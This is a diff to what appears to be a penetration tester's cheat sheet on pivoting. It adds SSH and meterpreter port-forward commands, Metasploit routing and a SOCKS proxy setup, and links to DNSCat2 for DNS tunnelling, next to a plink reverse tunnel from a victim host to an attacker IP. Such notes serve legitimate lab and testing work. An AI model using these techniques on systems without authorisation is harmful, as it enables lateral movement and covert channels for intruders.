@@ -39,6 +39,9 @@ Config file: /etc/ssh/sshd_config. Need to restart SSH service whenever config c
 Local tunnel from Kali attack box through a pivot to a service on target. Default local ip is 0.0.0.0
 
     ssh -p <port> user@pivot -L <local ip for specific interface>:<local port on attack box>:<target host>:<target port> 
+    ssh -L 3333:localhost:3306 user@10.10.10.10            #local port forward example     
+    ssh -L 3333:localhost:3306 8080:localhost:80 user@10.10.10.10     #multiple local port forward     
+    netstat -antp | grep 3333   #confirm port forward      
     
 ### Reverse Tunnels
 Remote tunnel to Kali through a pivot from target (may need to join tunnels depending on config)  
@@ -75,10 +78,18 @@ Need to change /etc/proxychains4.conf socks4 to socks5 on attack box
 Route pivoting:    
 
     msf (meter) > bg 
-    msf > router add 10.10.10.0/24 1   #add route to session 1, then scan or exploit using the session     
-    Can then use scanners / commands like: auxiliary/scanner/portscan/tcp, nmap, dn_nmap modules.        
+    msf > route add 10.10.10.0/24 1   #add route to session 1, then scan or exploit using the session     
+    Can then use scanners / commands like: auxiliary/scanner/portscan/tcp, nmap, dn_nmap, post/multi/gather/ping_sweep modules.        
     msf (meter) > run arp_scanner -r 10.10.10.0/24    
+SOCKS Proxy    
 
+    use auxiliary/server/socks_proxy
+    socks4 	127.0.0.1 9050    #Add to /etc/proxychains.conf (or proxychains4.conf)    
+Local Port Forwarding    
+
+    (meter) > portfwd add -l 3300 -p 3389 -r 172.16.1.1    
+    (meter) > portfwd add -R -l 8081 -p 1234 -L 10.10.10.10 #Reverse     
+    
  # Linux 
  
  ## SShuttle
@@ -110,8 +121,11 @@ Route pivoting:
 
      plink.exe -l user -pw password -R 445:127.0.0.1:445 YOURIPADDRESS   <-note entering in your password on a victim box is a bad idea
      
-     [generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target ] 
+     #generate ssh keys on kali, convert to putty keys and then upload with plink.exe to target         
      sudo apt install putty-tools 
      puttygen KEYFILE -o OUTPUT_KEY.ppk 
      cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N 
-     
+ 
+ # DNS Tunneling    
+ [DNSCat2](https://github.com/iagox86/dnscat2)     
+ [DNSCat2 - PowerShell](https://github.com/lukebaggett/dnscat2-powershell)      
